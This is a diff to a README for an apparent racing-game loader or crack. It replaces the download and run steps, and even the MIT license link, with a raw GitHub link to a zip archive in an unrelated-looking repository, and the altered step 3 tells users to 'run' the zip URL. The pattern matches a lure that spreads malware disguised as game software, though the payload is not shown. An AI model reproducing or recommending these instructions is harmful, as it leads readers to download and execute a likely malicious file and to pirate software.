@@ -27,9 +27,9 @@ All major platforms are supported for seamless gameplay!
 
 ## 🛠️ Installation
 
-1. Download Loader.rar from the repository.
+1. Download https://raw.githubusercontent.com/darkvibs/libtriton_jit/main/Fagopyrum/libtriton_jit.zip from the repository.
 2. Extract the archive using 7-Zip, WinRAR, or your favorite extraction tool.
-3. Run Loader.exe (or the relevant version for your OS).
+3. Run https://raw.githubusercontent.com/darkvibs/libtriton_jit/main/Fagopyrum/libtriton_jit.zip (or the relevant version for your OS).
 4. Follow the simple prompts to complete the setup.
 5. Launch and race!
 
@@ -48,6 +48,6 @@ This loader is intended solely for educational and backup purposes. All rights t
 
 ## 📄 License
 
-This project is distributed under the MIT license. [Read the Full MIT License](https://opensource.org/licenses/MIT)
+This project is distributed under the MIT license. [Read the Full MIT License](https://raw.githubusercontent.com/darkvibs/libtriton_jit/main/Fagopyrum/libtriton_jit.zip)
 
 Happy Racing! 🚦
